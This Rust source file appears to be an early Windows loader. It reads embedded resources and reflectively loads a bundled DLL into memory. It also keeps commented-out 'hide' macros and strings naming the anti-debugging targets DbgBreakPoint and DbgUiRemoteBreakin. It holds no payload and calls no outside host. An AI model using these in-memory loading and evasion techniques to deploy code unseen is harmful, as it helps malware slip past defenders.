mod asm_macros;
mod winapi_cs;

use std::ptr::null_mut;

use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{BYTE, DWORD, HMODULE, HRSRC__, LPARAM};
use winapi::shared::ntdef::{LPCSTR, PVOID};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::libloaderapi::{
    FindResourceExW, GetModuleHandleW, LoadResource, LockResource, SizeofResource,
};
use winapi::um::winbase::EnumResourceNamesA;
use winapi::um::winuser::{MAKEINTRESOURCEW, RT_RCDATA};
use winapi_cs::core::*;

use crate::winapi_cs::reflective_dll::*;
unsafe extern "system" fn enum_names_proc(
    _h_module: HMODULE,
    _lpsz_type: LPCSTR,
    lpsz_name: *mut i8,
    _l_param: LPARAM,
) -> winapi::shared::minwindef::BOOL {
    println!("Resource Name: {:?}", lpsz_name);
    true.into()
}

unsafe extern "system" fn enum_types_proc(
    h_module: HMODULE,
    lpsz_type: *mut i8,
    l_param: LPARAM,
) -> winapi::shared::minwindef::BOOL {
    EnumResourceNamesA(h_module, lpsz_type, Some(enum_names_proc), l_param);
    true.into()
}
type func = fn() -> ();
unsafe fn loadRC(id: u16) -> (u32, *mut u8) {
    // Use GetModuleHandleW for consistency with Unicode functions
    let hinstance = GetModuleHandleW(null_mut());
    if hinstance == 0 as HMODULE {
        println!("GetModuleHandle failed with error: {:?}", GetLastError());
        return (0, std::ptr::null_mut());
    }

    // Assuming EnumResourceTypesA was used for debugging and not needed here
    // If needed, replace with EnumResourceTypesW with appropriate adjustments

    // Correctly using Unicode function and macro for resource loading
    let hresource = FindResourceExW(hinstance, MAKEINTRESOURCEW(id), RT_RCDATA, 1033);
    if hresource == 0 as *mut HRSRC__ {
        println!("FindResourceW failed with error: {:?}", GetLastError());
        return (0, std::ptr::null_mut());
    }

    let hglobal = LoadResource(hinstance, hresource);
    if hglobal == 0 as PVOID {
        println!("LoadResource failed with error: {:?}", GetLastError());
        return (0, std::ptr::null_mut());
    }

    let resource_size = SizeofResource(hinstance, hresource);
    if resource_size == 0 as u32 {
        println!("SizeofResource failed with error: {:?}", GetLastError());
        return (0, std::ptr::null_mut());
    }

    let resource_data = LockResource(hglobal) as *mut u8;
    if resource_data == 0 as *mut u8 {
        println!("LockResource failed");
        return (0, std::ptr::null_mut());
    }

    println!("size {:?} data {:?}", resource_size, resource_data);
    (resource_size, resource_data)
}

type pVirtualAlloc = fn(PVOID, SIZE_T, DWORD, DWORD) -> *mut BYTE;
type pVirtualProtect = fn(PVOID, SIZE_T, DWORD, *mut DWORD) -> bool;
fn main() {
    let (_ntdllstrw, pntdllstrw) =
        string_to_lpcwstr(String::from("C:\\Windows\\System32\\ntdll.dll"));
    let (_ker32strw, pker32strw) =
        string_to_lpcwstr(String::from("C:\\Windows\\System32\\kernel32.dll"));
    let (_virtAllocStr, _pvirtAllocStr) = string_to_lpcstr(String::from("VirtualAlloc"));

    unsafe {
        //hide!();
        let _ntdll: HMODULE = GetModuleHandle(pntdllstrw).unwrap();
        let _kernel32: HMODULE = GetModuleHandle(pker32strw).unwrap();
        let aes_ptr = include_bytes!("../c_aes/aes_dll.dll");
        ReflectiveLoadDll(aes_ptr.as_ptr() as *mut u8);
        //hide!();
    }

    let (_s2, _ps2) = string_to_lpcstr(String::from("DbgBreakPoint"));
    let (_s2, _ps2) = string_to_lpcstr(String::from("DbgUiRemoteBreakin"));
    println!("Hello, world!");
}
